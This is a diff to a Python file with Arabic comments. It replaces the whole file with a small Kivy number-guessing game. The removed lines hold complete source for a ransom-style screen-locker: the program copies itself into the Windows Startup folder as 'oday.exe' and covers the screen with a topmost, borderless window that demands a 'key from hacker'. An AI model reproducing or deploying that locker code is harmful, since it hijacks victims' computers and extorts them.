@@ -1,61 +1,46 @@
-import tkinter as tk
-from tkinter import messagebox
-import os
-import sys
-import shutil
-import threading
+from kivy.app import App
+from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.label import Label
+from kivy.uix.button import Button
+from kivy.uix.textinput import TextInput
+from kivy.uix.popup import Popup
+import random
 
+class GuessGame(App):
+    def build(self):
+        self.number = random.randint(1, 20)
+        self.layout = BoxLayout(orientation='vertical')
+        
+        self.label = Label(text="خمن رقم بين 1 و20", font_size=30)
+        self.entry = TextInput(font_size=30, multiline=False)
+        self.button = Button(text="تخمين!", font_size=30)
+        self.button.bind(on_press=self.check_guess)
+        
+        self.layout.add_widget(self.label)
+        self.layout.add_widget(self.entry)
+        self.layout.add_widget(self.button)
+        return self.layout
 
-# تحديد مسار التطبيق
-path_app = os.path.abspath(sys.argv[0])
+    def check_guess(self, instance):
+        try:
+            guess = int(self.entry.text)
+            if guess == self.number:
+                self.show_popup("مبروك!", "لقد فزت! الرقم كان " + str(self.number))
+                self.number = random.randint(1, 20)
+            elif guess < self.number:
+                self.label.text = "الرقم أكبر من ذلك!"
+            else:
+                self.label.text = "الرقم أصغر من ذلك!"
+        except:
+            self.show_popup("خطأ", "من فضلك أدخل رقماً صحيحاً")
 
-# تحديد مجلد البداية في قائمة "ابدأ"
-run_start = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-name = os.path.join(run_start, "oday.exe")
+    def show_popup(self, title, message):
+        box = BoxLayout(orientation='vertical')
+        box.add_widget(Label(text=message))
+        btn = Button(text="حسناً")
+        popup = Popup(title=title, content=box)
+        btn.bind(on_press=popup.dismiss)
+        box.add_widget(btn)
+        popup.open()
 
-# إذا لم يكن التطبيق موجودًا في المجلد، قم بنسخه
-if not os.path.exists(name):
-    shutil.copy(path_app, name)
-
-# دالة للخروج من التطبيق
-def exit_app():
-    root.destroy()
-
-# دالة للتحقق من المفتاح المدخل
-def clos(event=None):
-    key = "1234567"
-    if entry.get() == key:
-        exit_app()
-    else:
-        messagebox.showerror("Don't play with me", "The key is wrong")
-
-# إعداد واجهة المستخدم
-root = tk.Tk()
-
-# إخفاء إطار النافذة
-root.overrideredirect(True)
-root.attributes("-topmost", True)
-
-# إضافة النصوص والعناصر
-tk.Label(root, text="Enter the key from hacker:", bg="green", fg="black").pack()
-
-entry = tk.Entry(root, width=50, border=0)
-entry.pack(pady=20)
-
-b = tk.Button(root, text="Submit", command=clos)
-b.pack()
-
-root.config(background="green")
-root.resizable(False, False)
-
-# جعل نافذة التطبيق تغطي الشاشة بالكامل
-root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}+0+0")
-root.title("Keno")
-
-tk.Label(root, text="hack@gmail.com", bg="green", fg="black").pack(pady=20)
-
-# استدعاء الدالة clos عند الضغط على Enter أو الزر Submit
-entry.bind("<Return>", clos)
-
-# تشغيل نافذة tkinter
-root.mainloop()
+GuessGame().run()
